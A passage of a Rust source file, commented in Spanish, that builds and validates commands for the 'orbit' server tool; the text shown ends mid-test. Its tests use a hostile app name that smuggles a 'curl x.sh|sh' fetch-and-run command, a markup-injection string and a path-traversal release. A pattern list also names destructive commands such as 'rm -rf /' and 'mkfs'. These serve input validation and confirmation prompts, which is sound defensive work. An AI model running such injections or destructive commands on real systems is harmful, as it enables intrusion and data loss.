//! El catálogo de órdenes que el cliente puede pedirle a un servidor.
//!
//! Es finito y está en un solo fichero **a propósito**: la regla nº 1 dice que
//! la interfaz sólo invoca `orbit`, y una regla así sólo es auditable si se
//! puede comprobar leyendo un sitio. Si esta lista crece, la superficie crece —
//! y crece en silencio si está repartida por veinte pantallas.
//!
//! La interfaz **no construye un `argv` a mano**. Construye un [`Comando`], y
//! este módulo lo traduce. El motivo es de corrección antes que de seguridad: un
//! `argv` escrito a mano en veinte sitios se equivoca en el sitio diecinueve, y
//! equivocarse aquí significa concatenar.
//!
//! Y hay reglas del servidor que aquí se convierten en imposibles de expresar,
//! que es mejor que convertirlas en errores en tiempo de ejecución:
//!
//! - `orbit deploy --json` **aborta sin el nombre de la app**, y `--pick` está
//!   prohibido con `--json`. Aquí el nombre es obligatorio en el tipo.
//! - Sin terminal, un comando sin app **no aborta: elige la primera por orden
//!   alfabético y sale con 0**. Con `restart` eso es reiniciar la app
//!   equivocada sin que nada lo diga. Por eso **ninguna variante de aquí puede
//!   omitir la app**.
//! - `--json` va **siempre delante**. Detrás, un comando que no lo habla se lo
//!   traga en silencio y sale con 0, porque no todos filtran lo que no conocen.
//!   Delante siempre muere, que es un comportamiento definido.

use crate::shquote;

/// Los campos con forma conocida se validan **antes** de construir la orden.
///
/// Esto es defensa en profundidad, **no** la defensa: el escapado es lo que
/// protege, y esto va encima. El orden importa —escapar siempre, validar
/// además—; quien lo hace al revés acaba con un filtro que crece cada vez que
/// alguien encuentra un carácter nuevo, que es la firma de que el diseño estaba
/// mal.
///
/// Lo que sí aporta: convierte un ataque en un mensaje de error legible, y
/// atrapa el caso que el escapado no puede atrapar — un nombre de app que llega
/// **del propio servidor**. `app_names()` en Orbit enumera los `.conf` sin
/// filtrar, así que un servidor con root comprometido puede meter ahí lo que
/// quiera. **Un dato que ha dado la vuelta por el servidor no es de más
/// confianza que uno tecleado: es de menos.**
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ErrorForma {
    NombreDeApp(String),
    ClaveDeEntorno(String),
    Release(String),
    Repo(String),
    Rama(String),
    Dominio(String),
    Correo(String),
    /// `orbit exec` sin comando abre un `bash` interactivo. Un cliente sin
    /// terminal no puede con eso, y fingir medio terminal es peor que no
    /// ofrecerlo: lo que se ofrece en su lugar es la orden `ssh` para pegarla
    /// en un terminal de verdad.
    ExecSinComando,
    Escapado(shquote::ErrorEscapado),
}

impl std::fmt::Display for ErrorForma {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NombreDeApp(s) => write!(f, "«{s}» no tiene forma de nombre de app"),
            Self::ClaveDeEntorno(s) => write!(f, "«{s}» no tiene forma de variable de entorno"),
            Self::Release(s) => write!(f, "«{s}» no tiene forma de release"),
            Self::Repo(s) => write!(
                f,
                "«{s}» no tiene forma de repositorio: se espera «usuario/repo» o una URL https"
            ),
            Self::Rama(s) => write!(f, "«{s}» no tiene forma de rama de git"),
            Self::Dominio(s) => write!(f, "«{s}» no tiene forma de dominio"),
            Self::Correo(s) => write!(f, "«{s}» no tiene forma de correo"),
            Self::ExecSinComando => write!(
                f,
                "«orbit exec» sin comando abre una shell interactiva, y aquí no hay terminal"
            ),
            Self::Escapado(e) => write!(f, "{e}"),
        }
    }
}

impl std::error::Error for ErrorForma {}

/// Copiada de `_app_name_ok` del Orbit real: `^[a-z0-9][a-z0-9._-]{0,39}$`, sin
/// `..`. Se copia en vez de inventarse porque el servidor es quien manda sobre
/// qué nombres existen.
///
/// Un nombre que no encaje **no se arregla**: un nombre arreglado ya no
/// identifica a nadie. Se enseña marcado y no se opera sobre él.
pub fn nombre_de_app_valido(s: &str) -> bool {
    if s.is_empty() || s.len() > 40 || s.contains("..") {
        return false;
    }
    let mut cs = s.chars();
    let primero = cs.next().unwrap();
    if !(primero.is_ascii_lowercase() || primero.is_ascii_digit()) {
        return false;
    }
    s.chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '_' | '-'))
}

/// Copiada de `_env_key_ok`: `^[A-Za-z_][A-Za-z0-9_]*$`.
pub fn clave_de_entorno_valida(s: &str) -> bool {
    let mut cs = s.chars();
    match cs.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    cs.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Deducida del formato `%Y%m%d-%H%M%S` con sufijo `-2`, `-3`… para las
/// colisiones dentro del mismo segundo.
pub fn release_valida(s: &str) -> bool {
    let (fecha, resto) = match s.split_once('-') {
        Some(v) => v,
        None => return false,
    };
    if fecha.len() != 8 || !fecha.chars().all(|c| c.is_ascii_digit()) {
        return false;
    }
    let (hora, sufijo) = match resto.split_once('-') {
        Some((h, s)) => (h, Some(s)),
        None => (resto, None),
    };
    if hora.len() != 6 || !hora.chars().all(|c| c.is_ascii_digit()) {
        return false;
    }
    match sufijo {
        None => true,
        Some(s) => !s.is_empty() && s.chars().all(|c| c.is_ascii_digit()),
    }
}

/// Un dominio, con la regla que aplica nginx: etiquetas de 1 a 63 caracteres,
/// separadas por puntos, sin guion al principio ni al final de una etiqueta.
///
/// No se acepta un dominio con `_`: nginx lo sirve, pero el certificado no se
/// puede emitir para él, y una web publicada que nunca podrá tener HTTPS es
/// justo el final parcial que este asistente existe para evitar.
pub fn dominio_valido(s: &str) -> bool {
    if s.is_empty() || s.len() > 253 || s.starts_with('.') || s.ends_with('.') {
        return false;
    }
    // Un dominio sin punto es un nombre de máquina de la red local, no algo a
    // lo que Let's Encrypt pueda emitir.
    if !s.contains('.') {
        return false;
    }
    s.split('.').all(|e| {
        !e.is_empty()
            && e.len() <= 63
            && !e.starts_with('-')
            && !e.ends_with('-')
            && e.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
    })
}

/// Una rama de git, con las prohibiciones de `git check-ref-format` que de
/// verdad importan aquí.
///
/// El guion inicial va aparte del resto porque no es una cuestión de forma sino
/// de quién interpreta el argumento: `--branch -X` se lo come el `getopts` del
/// otro lado antes de que nadie mire si la rama existe.
pub fn rama_valida(s: &str) -> bool {
    if s.is_empty() || s.len() > 255 || s.starts_with('-') {
        return false;
    }
    if s.starts_with('/') || s.ends_with('/') || s.contains("//") {
        return false;
    }
    if s.contains("..") || s.ends_with(".lock") || s.ends_with('.') {
        return false;
    }
    !s.chars().any(|c| {
        c.is_ascii_control() || matches!(c, ' ' | '~' | '^' | ':' | '?' | '*' | '[' | '\\')
    })
}

/// El origen: o `usuario/repo`, que es lo que entiende `gh`, o una URL entera.
///
/// Se aceptan las dos formas porque Orbit acepta las dos, y reducirlo a una
/// obligaría a reescribir a mano lo que se acaba de copiar del navegador. Lo
/// que no se acepta es un `ssh://` ni un `git@…`: esos autentican con la clave
/// del servidor, y adivinar aquí que existe sería prometer algo que no se ha
/// mirado.
pub fn repo_valido(s: &str) -> bool {
    if s.is_empty() || s.len() > 512 || s.starts_with('-') {
        return false;
    }
    if s.chars().any(|c| c.is_ascii_control() || c == ' ') {
        return false;
    }
    if let Some(resto) = s
        .strip_prefix("https://")
        .or_else(|| s.strip_prefix("http://"))
    {
        return !resto.is_empty() && resto.contains('/');
    }
    // usuario/repo, exactamente una barra y las dos partes con contenido.
    match s.split_once('/') {
        Some((u, r)) => {
            !u.is_empty()
                && !r.is_empty()
                && !r.contains('/')
                && u.chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
                && r.chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        }
        None => false,
    }
}

/// El correo del certificado. Deliberadamente laxo: quien valida de verdad es
/// Let's Encrypt, y una expresión regular estricta aquí sólo consigue rechazar
/// direcciones que existen.
pub fn correo_valido(s: &str) -> bool {
    match s.split_once('@') {
        Some((u, d)) => !u.is_empty() && !s.starts_with('-') && dominio_valido(d),
        None => false,
    }
}

/// Qué hacer con un campo que Orbit sabe detectar solo.
///
/// Son tres estados y no dos, y la diferencia no es cosmética: **`--build ''`
/// significa «esta app no se compila», que no es lo mismo que no decir nada.**
/// Un campo de texto vacío no puede querer decir las dos cosas, así que aquí
/// son variantes distintas y en la pantalla son dos estados visibles.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Anulacion {
    /// No se dice nada: manda la detección del servidor.
    Detectar,
    /// Se dice explícitamente que no hay valor. Viaja como `--x ''`.
    Vacia,
    Valor(String),
}

impl Anulacion {
    fn empujar(&self, v: &mut Vec<String>, bandera: &str) {
        match self {
            Self::Detectar => {}
            Self::Vacia => {
                v.push(bandera.into());
                v.push(String::new());
            }
            Self::Valor(s) => {
                v.push(bandera.into());
                v.push(s.clone());
            }
        }
    }
}

/// Lo que se le adelanta a la detección del servidor.
///
/// **Todo esto está vacío en el caso normal, y esa es la forma correcta de
/// usarlo.** No es un formulario que rellenar: es la respuesta a «ya sé que se
/// va a equivocar», que ocurre en un monorepo, con un adaptador que decide si
/// sale sitio estático o servidor, y con un proyecto que arranca con un script
/// propio.
///
/// La carpeta va la primera porque no es un campo más: cambiarla **redirige la
/// detección entera**, de modo que los otros cuatro se leen contra otro
/// directorio.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct AjustesDeteccion {
    pub carpeta: Option<String>,
    pub tipo: Option<String>,
    pub build: Option<Anulacion>,
    pub arranque: Option<Anulacion>,
    pub outdir: Option<Anulacion>,
}

impl AjustesDeteccion {
    /// Si no hay nada que adelantar, la orden no lleva ni una bandera de más.
    pub fn vacios(&self) -> bool {
        *self == Self::default()
    }
}

/// Cómo viaja lo que alguien escribe en la pantalla de `exec`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ModoDeExec {
    /// Argumentos separados. **No pasa por ningún shell**: el servidor ejecuta
    /// el `argv` tal cual, así que un `&&` es un argumento literal y no un
    /// operador. Es el modo por defecto porque es el que no sorprende.
    Argumentos(Vec<String>),
    /// Un solo argumento con el texto entero. El servidor lo reconoce por su
    /// regla y lo pasa a `bash -lc`, así que aquí `&&`, `|` y `$(…)` **sí**
    /// hacen lo que parece.
    Shell(String),
}

/// Qué se le puede pedir a un servidor. **Este enumerado es la superficie.**
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Comando {
    /// El saludo. Lo primero que se pregunta siempre.
    Version,
    Lista,
    /// Trae el array de apps **completo e idéntico** al de `Lista`, comprobado
    /// carácter a carácter. Así la portada cuesta una llamada y no dos.
    Estado,
    Info {
        app: String,
    },
    Doctor,
    /// Aplica lo que se puede arreglar sin decidir nada por nadie.
    ///
    /// Lleva `--yes` porque el servidor lo exige con `--json`: sin terminal no
    /// hay a quién preguntar, y dar por hecho que alguien ha dicho que sí sería
    /// aplicar cambios en su servidor sin que los acepte. La confirmación la
    /// pide la interfaz, que sí tiene delante a una persona.
    DoctorArreglar,
    /// Tarda ~1 s a propósito: la CPU es la diferencia entre dos lecturas, y una
    /// foto suelta tiene que esperar a la segunda. Con 40 apps son ~2,1 s.
    Top,
    Metricas {
        app: Option<String>,
    },
    Trafico {
        app: String,
        desde: Option<String>,
    },
    /// Devuelve sólo los **nombres**. Los secretos no cruzan el contrato.
    EntornoLista {
        app: String,
    },
    /// Un valor, pelado. Es un acto deliberado por comando, y así debe seguir.
    EntornoValor {
        app: String,
        clave: String,
    },
    BaseDeDatosLista,
    RedireccionesLista {
        app: Option<String>,
    },
    VigilanciaEstado,
    ColaEstado,
    CopiasLista,
    CopiasVerificar,
    /// NDJSON, y es la única excepción del contrato. Con `--json` no sigue en
    /// vivo salvo que se pida.
    Logs {
        app: String,
        desde: Option<String>,
        lineas: Option<u32>,
        seguir: bool,
        solo_nginx: bool,
    },
    /// El nombre es obligatorio: con `--json` el servidor aborta sin él.
    Desplegar {
        app: String,
        progreso: bool,
    },
    DesplegarTodo {
        progreso: bool,
    },
    /// Ejecuta algo dentro de una app.
    ///
    /// **Es la puerta trasera, y se trata como tal.** No se usa para nada de la
    /// interfaz —ni para leer un fichero, ni para contar releases, ni para
    /// tapar un hueco del contrato—, porque el día que se use, el cliente deja
    /// de hablar el contrato y pasa a hablar Bash contra un servidor cuyo
    /// layout puede cambiar.
    ///
    /// Los dos modos existen porque el servidor tiene una **regla del argumento
    /// único**: si le llega uno solo y contiene metacaracteres, lo ejecuta con
    /// `bash -lc`; con dos o más, ejecuta el `argv` tal cual. O sea que
    /// `exec web "ls -la"` y `exec web ls -la` **no son lo mismo**.
    ///
    /// Aplicar esa heurística por dentro sería lo peor de las tres opciones:
    /// quien escribe no podría predecir cuándo su `&&` se ejecuta y cuándo se
    /// pasa como texto, y **una herramienta de depuración que no es predecible
    /// tampoco sirve**. Así que se elige, y se ve.
    ///
    /// Nótese lo que esto **no** es: aunque uno de los modos acabe en un shell
    /// remoto, el cliente **nunca construye una cadena de shell**. Pasa N
    /// argumentos o pasa uno, y los dos caminos van por el mismo escapador. La
    /// decisión de meter eso en un shell la toma Orbit, no nosotros.
    Ejecutar {
        app: String,
        modo: ModoDeExec,
    },
    /// Retira una app **sin borrar sus datos**. Reversible.
    ///
    /// Quita el vhost, la unidad de systemd, el pool de php-fpm y el descriptor
    /// de `/etc/orbit`. Todo eso se rehace con `orbit new` en un minuto, y por
    /// eso es una operación distinta de la de abajo — no una casilla al lado.
    ///
    /// Lleva `-y` porque el cliente no tiene terminal donde contestar, y **eso
    /// significa que la pregunta que Orbit hacía la tiene que hacer la
    /// interfaz**. `-y` quiere decir «acepta el valor por defecto», y el valor
    /// por defecto del borrado de datos es «no»: por eso esto NO borra nada.
    Retirar {
        app: String,
    },
    /// Retira una app **y borra sus datos**. Irreversible.
    ///
    /// `rm -rf /srv/apps/<app>` se lleva el `.env`, todas las releases y **las
    /// subidas de los usuarios finales** —que viven en `shared/` precisamente
    /// para sobrevivir a los despliegues— y con `--purge` también el usuario de
    /// sistema. Eso no vuelve.
    ///
    /// Y aquí está el hallazgo que cambia el diseño de toda la pantalla:
    /// **`orbit remove -y --purge` no pregunta absolutamente nada**. El «escribe
    /// el nombre» de Orbit sólo ocurre sin `-y`, y `--purge` cortocircuita la
    /// segunda pregunta. Como el cliente tiene que pasar `-y`, **toda la
    /// protección se traslada aquí**:
    ///
    /// > Aquí no hay red debajo. Si esa pantalla se equivoca, no hay una segunda
    /// > pregunta en el servidor que la pare.
    RetirarYBorrar {
        app: String,
    },
    /// La release es obligatoria: sin ella y sin terminal, `rollback` aborta —y
    /// hace bien, porque el «valor por defecto» sería la que ya está activa.
    Revertir {
        app: String,
        release: String,
    },
    /// Crea una web. Es la orden **más larga y la única sin `--json`**, y las
    /// dos cosas cambian cómo se trata.
    ///
    /// Sin `--json`, `_ui_route` deja `UI_FD=1`: **toda la prosa sale por
    /// stdout**, al revés que en el resto del catálogo. Eso no se decide en la
    /// llamada sino en [`Comando::vena_humana`], porque es un hecho de la orden
    /// y no del sitio desde el que se invoca.
    ///
    /// Y su código de salida **no es informativo**: `new` despliega por dentro,
    /// así que puede devolver `1` con la aplicación creada, registrada y con
    /// vhost. Por eso quien la ejecuta no lee ni el código ni la prosa: vuelve a
    /// preguntar con `info --json`, que sí tiene contrato y no depende del
    /// idioma del servidor.
    ///
    /// `--yes` es obligatorio y **no quiere decir «que sí a todo»**: quiere
    /// decir «acepta lo que está por defecto», y por defecto no se crea la base
    /// de datos ni se abre el editor del `.env`. La base de datos, si se quiere,
    /// se pide aparte y a la vista.
    ///
    /// Va en una caja y no suelta en el enumerado porque tiene diez veces más
    /// campos que la variante mediana, y un enumerado se copia entero cada vez
    /// que se pasa: sin la caja, cada `Comando::Lista` de la portada ocuparía lo
    /// que ocupa la orden más larga del catálogo.
    Nueva(Box<WebNueva>),
}

/// Lo que hace falta para crear una web. Fuera del enumerado, en su propia
/// estructura, por el tamaño — ver [`Comando::Nueva`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WebNueva {
    pub nombre: String,
    pub repo: String,
    pub rama: String,
    pub dominio: String,
    /// Dominios adicionales. Vacío **no es lo mismo** que no pasar `--aliases`:
    /// el servidor distingue los dos casos con `aliases_set`, así que aquí la
    /// lista vacía significa «ninguno, y lo digo yo».
    pub alias: Vec<String>,
    /// El correo de Let's Encrypt. Sin él, y sin uno configurado ya en el
    /// servidor, el certificado no se emite: la web queda publicada por HTTP y
    /// `new` avisa sin fallar. Es el final F2, y es evitable desde aquí.
    pub correo: Option<String>,
    pub base_de_datos: bool,
    /// `false` añade `--no-ssl`. Es una decisión que se toma, no un ajuste que
    /// se olvida.
    pub https: bool,
    pub ajustes: AjustesDeteccion,
}

impl Comando {
    /// El `argv` completo, con la ruta absoluta del binario delante.
    ///
    /// **Nunca por `PATH`**: un `PATH` manipulado en el `.bashrc` del usuario
    /// remoto —o por quien sólo tenga escritura en su `$HOME`— redirige todos
    /// los comandos a otro binario.
    pub fn argv(&self, binario: &str) -> Result<Vec<String>, ErrorForma> {
        let app_ok = |a: &String| -> Result<String, ErrorForma> {
            if nombre_de_app_valido(a) {
                Ok(a.clone())
            } else {
                Err(ErrorForma::NombreDeApp(a.clone()))
            }
        };

        let mut v: Vec<String> = vec![binario.to_string()];
        // '--json' delante del subcomando, siempre. Es la única posición con un
        // comportamiento definido.
        let json = |v: &mut Vec<String>| v.push("--json".into());

        match self {
            Self::Version => {
                json(&mut v);
                v.push("version".into());
            }
            Self::Lista => {
                json(&mut v);
                v.push("list".into());
            }
            Self::Estado => {
                json(&mut v);
                v.push("status".into());
            }
            Self::Doctor => {
                json(&mut v);
                v.push("doctor".into());
            }
            Self::DoctorArreglar => {
                json(&mut v);
                v.extend(["doctor".into(), "--fix".into(), "--yes".into()]);
            }
            Self::Top => {
                json(&mut v);
                v.push("top".into());
            }
            Self::BaseDeDatosLista => {
                json(&mut v);
                v.extend(["db".into(), "list".into()]);
            }
            Self::VigilanciaEstado => {
                json(&mut v);
                v.extend(["watch".into(), "status".into()]);
            }
            Self::ColaEstado => {
                json(&mut v);
                v.extend(["queue".into(), "status".into()]);
            }
            Self::CopiasLista => {
                json(&mut v);
                v.extend(["backup".into(), "list".into()]);
            }
            Self::CopiasVerificar => {
                json(&mut v);
                v.extend(["backup".into(), "verify".into()]);
            }
            Self::Info { app } => {
                json(&mut v);
                v.push("info".into());
                v.push(app_ok(app)?);
            }
            Self::Metricas { app } => {
                json(&mut v);
                v.push("metrics".into());
                if let Some(a) = app {
                    v.push(app_ok(a)?);
                }
            }
            Self::Trafico { app, desde } => {
                json(&mut v);
                v.push("traffic".into());
                v.push(app_ok(app)?);
                if let Some(d) = desde {
                    v.push("--since".into());
                    v.push(d.clone());
                }
            }
            Self::EntornoLista { app } => {
                json(&mut v);
                v.extend(["env".into(), "list".into()]);
                v.push(app_ok(app)?);
            }
            Self::EntornoValor { app, clave } => {
                // Sin '--json': 'env get' imprime el valor pelado, a propósito.
                if !clave_de_entorno_valida(clave) {
                    return Err(ErrorForma::ClaveDeEntorno(clave.clone()));
                }
                v.extend(["env".into(), "get".into()]);
                v.push(app_ok(app)?);
                v.push(clave.clone());
            }
            Self::RedireccionesLista { app } => {
                json(&mut v);
                v.extend(["redirect".into(), "list".into()]);
                if let Some(a) = app {
                    v.push(app_ok(a)?);
                }
            }
            Self::Logs {
                app,
                desde,
                lineas,
                seguir,
                solo_nginx,
            } => {
                json(&mut v);
                v.push("logs".into());
                v.push(app_ok(app)?);
                if let Some(d) = desde {
                    v.push("--since".into());
                    v.push(d.clone());
                }
                if let Some(n) = lineas {
                    v.push("--lines".into());
                    v.push(n.to_string());
                }
                if *seguir {
                    v.push("--follow".into());
                }
                if *solo_nginx {
                    v.push("--nginx".into());
                }
            }
            Self::Desplegar { app, progreso } => {
                json(&mut v);
                v.push("deploy".into());
                v.push(app_ok(app)?);
                if *progreso {
                    v.push("--progress".into());
                }
            }
            Self::DesplegarTodo { progreso } => {
                json(&mut v);
                v.extend(["deploy".into(), "--all".into()]);
                if *progreso {
                    v.push("--progress".into());
                }
            }
            Self::Ejecutar { app, modo } => {
                // Sin '--json': la salida de `exec` es la del comando, sin
                // envolver y sin formatear, y eso es lo correcto. Orbit lo
                // rechaza explícitamente por delante, y por detrás se lo pasa al
                // comando — que es lo que quiere quien escribe
                // `orbit exec app mi-script --json`.
                v.push("exec".into());
                v.push(app_ok(app)?);
                match modo {
                    ModoDeExec::Argumentos(args) => {
                        if args.is_empty() {
                            // Sin comando, `orbit exec` abre un bash
                            // interactivo, y un cliente sin terminal no puede
                            // con eso. Fingir medio terminal es, en palabras de
                            // la propia documentación de Orbit, la peor
                            // solución de todas.
                            return Err(ErrorForma::ExecSinComando);
                        }
                        v.extend(args.iter().cloned());
                    }
                    ModoDeExec::Shell(texto) => {
                        if texto.trim().is_empty() {
                            return Err(ErrorForma::ExecSinComando);
                        }
                        v.push(texto.clone());
                    }
                }
            }
            Self::Retirar { app } => {
                v.push("remove".into());
                v.push(app_ok(app)?);
                v.push("-y".into());
            }
            Self::RetirarYBorrar { app } => {
                v.push("remove".into());
                v.push(app_ok(app)?);
                // Las dos banderas, y '--purge' aparte de '-y' a propósito: son
                // daños de categoría distinta y Orbit los separó por eso.
                v.push("-y".into());
                v.push("--purge".into());
            }
            Self::Revertir { app, release } => {
                if !release_valida(release) {
                    return Err(ErrorForma::Release(release.clone()));
                }
                v.push("rollback".into());
                v.push(app_ok(app)?);
                v.push(release.clone());
            }
            Self::Nueva(n) => {
                let WebNueva {
                    nombre,
                    repo,
                    rama,
                    dominio,
                    alias,
                    correo,
                    base_de_datos,
                    https,
                    ajustes,
                } = n.as_ref();
                // Sin '--json': `new` no lo tiene. Ponerlo no daría un objeto,
                // daría un error de sintaxis.
                if !repo_valido(repo) {
                    return Err(ErrorForma::Repo(repo.clone()));
                }
                if !rama_valida(rama) {
                    return Err(ErrorForma::Rama(rama.clone()));
                }
                if !dominio_valido(dominio) {
                    return Err(ErrorForma::Dominio(dominio.clone()));
                }
                for a in alias {
                    if !dominio_valido(a) {
                        return Err(ErrorForma::Dominio(a.clone()));
                    }
                }
                if let Some(c) = correo {
                    if !correo_valido(c) {
                        return Err(ErrorForma::Correo(c.clone()));
                    }
                }
                v.push("new".into());
                v.push("--yes".into());
                v.push("--repo".into());
                v.push(repo.clone());
                v.push("--branch".into());
                v.push(rama.clone());
                v.push("--name".into());
                v.push(app_ok(nombre)?);
                v.push("--domain".into());
                v.push(dominio.clone());
                // Separados por ESPACIOS, que es como los lee el servidor:
                // `for a in $A_ALIASES` y `read -ra`, no por comas. Con comas
                // llegan como un solo alias con una coma dentro, y eso viaja
                // hasta el `-d` de certbot.
                //
                // La lista vacía se pasa igualmente: para el servidor «sin
                // alias, y lo digo yo» y «no he dicho nada» son dos casos, y el
                // segundo le deja inventarse el 'www.'.
                v.push("--aliases".into());
                v.push(alias.join(" "));
                if let Some(c) = correo {
                    v.push("--email".into());
                    v.push(c.clone());
                }
                if *base_de_datos {
                    v.push("--db".into());
                }
                if !*https {
                    v.push("--no-ssl".into());
                }
                if let Some(c) = &ajustes.carpeta {
                    v.push("--appdir".into());
                    v.push(c.clone());
                }
                if let Some(t) = &ajustes.tipo {
                    v.push("--type".into());
                    v.push(t.clone());
                }
                if let Some(b) = &ajustes.build {
                    b.empujar(&mut v, "--build");
                }
                if let Some(a) = &ajustes.arranque {
                    a.empujar(&mut v, "--start");
                }
                if let Some(o) = &ajustes.outdir {
                    o.empujar(&mut v, "--outdir");
                }
            }
        }
        Ok(v)
    }

    /// La orden ya escapada, lista para el shell remoto.
    pub fn linea(&self, binario: &str) -> Result<String, ErrorForma> {
        let argv = self.argv(binario)?;
        shquote::build(&argv).map_err(ErrorForma::Escapado)
    }

    /// Si la respuesta es un único objeto JSON o un flujo NDJSON. `logs` es la
    /// única excepción, y se declara aquí para que el transporte no tenga que
    /// adivinarlo.
    pub fn es_flujo(&self) -> bool {
        matches!(self, Self::Logs { .. })
    }

    /// Por qué tubería sale lo que está escrito para una persona.
    ///
    /// No es un detalle de implementación: es la línea 447 del Orbit real,
    /// `_ui_route() { [[ "$JSON" == "yes" ]] && UI_FD=2 || UI_FD=1; }`. O sea
    /// que **el encaminamiento depende de si la orden lleva `--json`**, y sólo
    /// de eso.
    ///
    /// Casi todo el catálogo lleva `--json` y por tanto habla por stderr, que es
    /// lo que hizo fácil dar por hecho que siempre era así. `new` es la única
    /// orden larga que no lo lleva, y ahí la prosa sale por stdout: servir
    /// stderr durante `new` es servir una tubería que se queda muda tres
    /// minutos.
    ///
    /// Se decide aquí, a partir del propio `argv`, y no en cada llamada: un
    /// dato que hay que acordarse de pasar bien es un dato que alguien pasará
    /// mal.
    pub fn vena_humana(&self) -> Vena {
        match self.argv("orbit") {
            Ok(v) => {
                if v.iter().any(|a| a == "--json") {
                    Vena::Stderr
                } else {
                    Vena::Stdout
                }
            }
            // Si no se puede construir el argv no se va a ejecutar nada; el
            // valor da igual y el del resto del catálogo es el menos raro.
            Err(_) => Vena::Stderr,
        }
    }
}

/// Cuál de las dos tuberías lleva la prosa, y cuál el resultado.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Vena {
    /// El caso del catálogo: `--json` manda la prosa a stderr y deja stdout
    /// limpio para el objeto.
    Stderr,
    /// Sin `--json` no hay objeto que proteger y la prosa se queda en stdout.
    Stdout,
}

/// Los patrones que hacen que la pantalla de `exec` pida una confirmación
/// reforzada.
///
/// **Es una lista negra, y por eso su valor es pedagógico y no defensivo.** No
/// impide nada: hay mil formas de escribir un `rm`, y quien quiera saltársela lo
/// hará sin proponérselo. Lo que sí para es el **error de dedos a las tres de la
/// mañana**, que es el caso real y el único contra el que una lista así sirve.
///
/// Se documenta así a propósito para que nadie la confunda con una protección y
/// construya encima suponiendo que lo es.
pub fn parece_peligroso(texto: &str) -> Option<&'static str> {
    let t = texto.to_lowercase();
    const PATRONES: [(&str, &str); 7] = [
        ("rm -rf /", "borra recursivamente desde una ruta absoluta"),
        ("drop database", "borra una base de datos entera"),
        ("truncate", "vacía una tabla"),
        ("mkfs", "formatea un sistema de ficheros"),
        ("dd of=/dev/", "escribe directamente sobre un dispositivo"),
        ("chmod -r 777 /", "abre los permisos de todo"),
        ("> /dev/sd", "escribe sobre un disco"),
    ];
    PATRONES
        .iter()
        .find(|(p, _)| t.contains(p))
        .map(|(_, q)| *q)
}

#[cfg(test)]
mod tests {
    use super::*;
    const B: &str = "/usr/local/bin/orbit";

    #[test]
    fn el_json_va_siempre_delante() {
        let v = Comando::Lista.argv(B).unwrap();
        assert_eq!(v, [B, "--json", "list"]);
        // Detrás, un comando que no lo habla se lo traga en silencio y sale
        // con 0. Delante siempre muere. Sólo una de las dos es un contrato.
        assert_eq!(v[1], "--json");
    }

    #[test]
    fn nunca_se_invoca_por_path() {
        for c in [Comando::Version, Comando::Lista, Comando::Doctor] {
            assert!(c.argv(B).unwrap()[0].starts_with('/'));
        }
    }

    #[test]
    fn un_nombre_de_app_hostil_no_llega_a_construir_la_orden() {
        let malo = "a'; curl x.sh|sh; '".to_string();
        let r = Comando::Info { app: malo.clone() }.argv(B);
        assert_eq!(r, Err(ErrorForma::NombreDeApp(malo)));
    }

    #[test]
    fn un_nombre_con_marcado_tampoco() {
        let r = Comando::Info {
            app: "</script><img src=x>".into(),
        }
        .argv(B);
        assert!(matches!(r, Err(ErrorForma::NombreDeApp(_))));
    }

    #[test]
    fn la_regla_del_nombre_es_la_del_servidor() {
        assert!(nombre_de_app_valido("mi-web"));
        assert!(nombre_de_app_valido("viejo.com")); // las redirecciones de dominio
        assert!(nombre_de_app_valido("a"));
        assert!(nombre_de_app_valido(&"a".repeat(40)));
        assert!(!nombre_de_app_valido(&"a".repeat(41)));
        assert!(!nombre_de_app_valido("Web")); // sin mayúsculas
        assert!(!nombre_de_app_valido("-web")); // no empieza por guion
        assert!(!nombre_de_app_valido("a..b")); // travesía de rutas
        assert!(!nombre_de_app_valido(""));
        assert!(!nombre_de_app_valido("оrbit")); // o cirílica
    }

    #[test]
    fn una_release_inventada_se_rechaza() {
        assert!(release_valida("20260805-041230"));
        assert!(release_valida("20260805-041230-2"));
        assert!(!release_valida("../../etc/passwd"));
        assert!(!release_valida("current"));
        let r = Comando::Revertir {
            app: "web".into(),
            release: "current".into(),
        }
        .argv(B);
        assert!(matches!(r, Err(ErrorForma::Release(_))));
    }

    #[test]
    fn una_clave_de_entorno_inventada_se_rechaza() {
        assert!(clave_de_entorno_valida("DB_PASSWORD"));
        assert!(!clave_de_entorno_valida("DB-PASSWORD"));
        assert!(!clave_de_entorno_valida("1DB"));
        let r = Comando::EntornoValor {
            app: "web".into(),
            clave: "a b".into(),
        }
        .argv(B);
        assert!(matches!(r, Err(ErrorForma::ClaveDeEntorno(_))));
    }

    #[test]
    fn env_get_no_lleva_json_porque_imprime_el_valor_pelado() {
        let v = Comando::EntornoValor {
            app: "web".into(),
            clave: "DB_PASSWORD".into(),
        }
        .argv(B)
        .unwrap();
        assert!(!v.iter().any(|x| x == "--json"));
    }

    #[test]
    fn arreglar_lleva_el_yes_que_el_servidor_exige() {
        // Sin `--yes`, `doctor --fix --json` se niega: sin terminal no hay a
        // quién preguntar. Y ese camino estuvo documentado y MUERTO durante
        // versiones, porque `--yes` no era una bandera global — así que contra
        // un servidor viejo esto falla, y la interfaz vuelve a enseñar la orden
        // para copiar.
        let v = Comando::DoctorArreglar.argv(B).unwrap();
        assert_eq!(v, [B, "--json", "doctor", "--fix", "--yes"]);
    }

    #[test]
    fn los_dos_modos_de_exec_producen_argv_distintos() {
        // `exec web "ls -la"` y `exec web ls -la` NO son lo mismo: el primero
        // pasa por un shell y el segundo no. La diferencia se elige, no se
        // adivina — una herramienta de depuración que no es predecible tampoco
        // sirve.
        let uno = Comando::Ejecutar {
            app: "web".into(),
            modo: ModoDeExec::Shell("ls -la".into()),
